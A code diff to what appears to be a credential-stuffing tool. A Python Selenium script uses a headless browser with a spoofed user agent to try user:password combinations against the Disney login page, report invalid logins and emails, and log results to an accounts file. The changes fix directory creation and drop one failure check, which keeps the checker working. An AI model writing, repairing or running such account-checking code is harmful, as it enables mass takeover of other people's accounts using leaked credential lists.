@@ -28,9 +28,10 @@ def disney():
     browser_options.add_argument(
         'user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
     browser_options.add_argument("--headless=new")
-    os.makedirs(plain_directory + '/accounts', exist_ok=False)
+    os.makedirs(plain_directory + '/accounts', exist_ok=True)
     index = 0
     while index != len(users):
+        os.makedirs(plain_directory + '/accounts', exist_ok=True)
         with open(plain_directory + '/accounts/disney_acc', 'a') as account_results:
             try:
                 print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
@@ -47,9 +48,6 @@ def disney():
                     email_submit_button = browser.find_element(By.XPATH, '//*[@id="loginEmail"]/div[2]/button')
                     email_submit_button.click()
                     time.sleep(2)
-                if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[2]/div/div'):
-                    print(" | {}:{} ---> Invalid Login".format(users[index], passwords[index]))
-                    iframe = True
                 if browser.find_elements(By.XPATH, '//*[@id="app_index"]/div[3]/div/div'):
                     print(" | {}:{} ---> Invalid Email".format(users[index], passwords[index]))
                     iframe = True
